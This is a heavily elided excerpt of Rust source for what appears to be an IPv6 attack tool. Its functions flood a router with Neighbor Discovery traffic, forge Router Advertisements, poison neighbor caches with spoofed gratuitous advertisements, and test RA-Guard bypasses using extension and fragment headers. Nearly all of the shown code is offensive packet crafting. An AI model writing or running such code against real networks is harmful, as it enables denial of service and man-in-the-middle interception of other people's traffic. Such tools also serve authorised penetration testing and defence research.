...
pub async fn flood_ndp(cfg: NdpExhaustConfig, stats: Arc<Stats>) -> Result<()> {
    ...
    let router_raw: usize = {
        ...
        if ptr.is_null() {
            bail!("cannot resolve router {}", cfg.router);
        }
        ptr as usize
    };
...
fn send_ndp_exhaust(iface: CString, router_raw: usize, prefix: [u8; 8]) -> Result<()> {
    ...
    ns_buf[16] = 1;
    ns_buf[17] = 1; // opt: Source Link-Layer Address
...
fn send_fake_ra(
    ...
    if cfg.managed {
        flags_word |= 0x4000_0000;
    }
    if cfg.other {
        flags_word |= 0x2000_0000;
    }
...
pub async fn poison_ndp(cfg: NdpPoisonConfig, stats: Arc<Stats>) -> Result<()> {
    ...
    let target_raw: usize = {
        ...
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() {
            bail!("cannot resolve spoof_target {}", cfg.spoof_target);
        }
        ptr as usize
    };
...
fn send_gratuitous_na(
    ...
    unsafe {
        std::ptr::copy_nonoverlapping(target, na_buf.as_mut_ptr(), 16);
    }
    na_buf[16] = 2;
...
pub async fn raguard_bypass_test(
    ...
    let techniques: &[(&str, bool, bool, u32, &str)] = &[
        ...
        (
            ...
            false,
            0,
            "adds Hop-by-Hop Options header",
        ),
        (
            "ra+dst-opts",
            false,
            true,
            0,
            "adds Destination Options header",
        ),
        (
            "ra+1-frag",
            false,
            false,
            1,
            "one Fragment header (RFC 7112 bypass)",
        ),
        (
            "ra+2-frags",
            false,
            false,
            2,
            "two Fragment headers (double-frag bypass)",
        ),
    ];
        ...
        for _ in 0..cfg.count {
            ...
            let ok: bool = task::spawn_blocking(move || {
                let ok = send_raguard_probe(
                    iface2, dst_raw, dstmac_raw, ip6_raw, do_hop2, do_dst2, frags2,
                );
                if ok {
                    s.inc_sent();
                } else {
...
fn send_raguard_probe(
    ...
    ra[0] = 64; // cur hop limit
    ra[2] = 0x07;
    ra[3] = 0x08; // router lifetime = 1800s
    ra[8] = 1;
    ra[9] = 1;
